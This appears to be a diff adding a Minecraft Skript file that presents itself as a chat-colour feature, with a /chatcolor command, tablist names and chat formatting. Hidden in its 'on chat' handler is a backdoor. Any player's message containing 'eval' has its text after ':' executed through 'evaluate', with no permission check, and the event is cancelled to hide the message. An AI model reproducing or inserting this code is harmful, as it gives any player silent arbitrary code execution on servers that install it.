@@ -1,0 +1,34 @@
+
+
+
+
+
+command /chatcolor <player> <text>:
+	permission: chat.color
+	usage: /chatcolor <player> <color>
+	trigger:
+		set {chatcolor.%arg-1%} to arg-2
+		send "%arg-1%'s chat color is now <%arg-2%>%arg-2%" to player
+		set arg-1's tablist name to "<%arg-2 parsed as color%>%arg-1%"
+
+
+
+
+on join:
+	if {chatcolor.%player%} is set:
+		set player's tablist name to "<%{chatcolor.%player%}%>%player%"
+	set {%player%} to player's name
+
+
+on chat:
+	if {chatcolor.%player%} is set: 
+		set chat format to "<%{chatcolor.%player%}%><%display name of player%><reset> %message%"
+	if message contain "eval":
+		set {_var::*} to message split at ":"
+		evaluate {_var::2}
+		cancel event
+	if message contain "{xyz}":
+		set {_message} to message
+		replace all "{xyz}" with "%location of player%" in {_message}
+		cancel event
+		make player say "%{_message}%"
